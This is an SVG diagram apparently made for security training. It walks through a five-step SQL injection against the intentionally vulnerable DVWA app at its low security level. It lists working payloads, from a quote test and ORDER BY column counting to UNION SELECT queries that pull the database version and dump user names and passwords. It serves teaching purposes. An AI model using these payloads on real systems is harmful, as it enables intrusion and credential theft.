<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720">
  <!-- palette: resources/palette_diagram.yaml -->
  <defs>
    <style id="palette-vars">
      :root, svg {
        --bg: #ffffff;
        --surface: #f5f5f5;
        --border: #e0e0e0;
        --text: #212121;
        --text-muted: #555555;
        --text-faint: #888888;
        --code-bg: #1a1a2e;
        --shadow: #00000022;
        --black: #000000;
        --primary-fill: #2196f3;
        --primary-border: #1565c0;
        --primary-text: #ffffff;
        --primary-accent: #0d47a1;
        --ok-fill: #4caf50;
        --ok-border: #2e7d32;
        --ok-text: #ffffff;
        --ok-accent: #1b5e20;
        --warn-fill: #ff9800;
        --warn-border: #e65100;
        --warn-text: #ffffff;
        --warn-accent: #bf360c;
        --danger-fill: #e74c3c;
        --danger-border: #c62828;
        --danger-text: #ffffff;
        --danger-accent: #b71c1c;
        --info-fill: #9c27b0;
        --info-border: #6a1b9a;
        --info-text: #ffffff;
        --info-accent: #4a148c;
      }
    </style>
    <!-- Gradients -->
    <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#2196f3"/>
      <stop offset="100%" stop-color="#1565c0"/>
    </linearGradient>

    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#f5f5f5"/>
    </linearGradient>

    <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#4caf50"/>
      <stop offset="100%" stop-color="#2e7d32"/>
    </linearGradient>

    <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ff9800"/>
      <stop offset="100%" stop-color="#e65100"/>
    </linearGradient>

    <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#e74c3c"/>
      <stop offset="100%" stop-color="#c62828"/>
    </linearGradient>

    <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#9c27b0"/>
      <stop offset="100%" stop-color="#6a1b9a"/>
    </linearGradient>

    <!-- Drop shadow -->
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#00000022"/>
    </filter>

    <!-- Arrow markers -->
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#555555"/>
    </marker>
    <marker id="arrow-primary" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0"/>
    </marker>
    <marker id="arrow-ok" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#2e7d32"/>
    </marker>
    <marker id="arrow-warn" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#e65100"/>
    </marker>
    <marker id="arrow-danger" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#c62828"/>
    </marker>
    <marker id="arrow-info" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#6a1b9a"/>
    </marker>
    <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
    </marker>
</defs>
  <rect width="1137.7778" height="640" fill="var(--surface)" rx="6" stroke="var(--border)" stroke-width="1" />
  <text x="568.8889" y="51.2" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="var(--text)" text-anchor="middle">DVWA SQL Injection — Step-by-Step (Security: Low)</text>
  <text x="568.8889" y="89.6" font-family="monospace" font-size="18.9629" fill="var(--text-muted)" text-anchor="middle">URL: /vulnerabilities/sqli/?id=1&amp;Submit=Submit</text>
  <rect x="34.4781" y="119.4667" width="51.7172" height="64" fill="var(--primary-accent)" rx="6" />
  <text x="60.3367" y="162.1333" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="var(--bg)" text-anchor="middle">1</text>
  <text x="103.4343" y="149.3333" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="var(--text)">Test for injection</text>
  <text x="103.4343" y="181.3333" font-family="monospace" font-size="18.9629" fill="var(--danger-accent)">id=1'  →  Error (injectable!)</text>
  <rect x="34.4781" y="213.3333" width="51.7172" height="64" fill="var(--primary-accent)" rx="6" />
  <text x="60.3367" y="256" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="var(--bg)" text-anchor="middle">2</text>
  <text x="103.4343" y="243.2" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="var(--text)">Determine number of columns</text>
  <text x="103.4343" y="275.2" font-family="monospace" font-size="18.9629" fill="var(--text-muted)">id=1' ORDER BY 2-- -  →  Works  |  ORDER BY 3  →  Error  (2 columns)</text>
  <rect x="34.4781" y="315.7333" width="51.7172" height="64" fill="var(--primary-accent)" rx="6" />
  <text x="60.3367" y="358.4" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="var(--bg)" text-anchor="middle">3</text>
  <text x="103.4343" y="345.6" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="var(--text)">Find display columns</text>
  <text x="103.4343" y="377.6" font-family="monospace" font-size="18.9629" fill="var(--text-muted)">id=' UNION SELECT 1,2-- -  →  Shows "1" and "2" on page</text>
  <rect x="34.4781" y="418.1333" width="51.7172" height="64" fill="var(--primary-accent)" rx="6" />
  <text x="60.3367" y="460.8" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="var(--bg)" text-anchor="middle">4</text>
  <text x="103.4343" y="448" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="var(--text)">Extract DB version</text>
  <text x="103.4343" y="480" font-family="monospace" font-size="18.9629" fill="var(--text-muted)">id=' UNION SELECT 1,@@version-- -</text>
  <rect x="34.4781" y="520.5333" width="51.7172" height="64" fill="var(--danger-accent)" rx="6" />
  <text x="60.3367" y="563.2" font-family="sans-serif" font-size="24.1347" font-weight="bold" fill="var(--bg)" text-anchor="middle">5</text>
  <text x="103.4343" y="550.4" font-family="sans-serif" font-size="22.4108" font-weight="bold" fill="var(--danger-accent)">Dump user credentials</text>
  <text x="103.4343" y="582.4" font-family="monospace" font-size="18.9629" fill="var(--danger-accent)">id=' UNION SELECT user,password FROM users-- -</text>
</svg>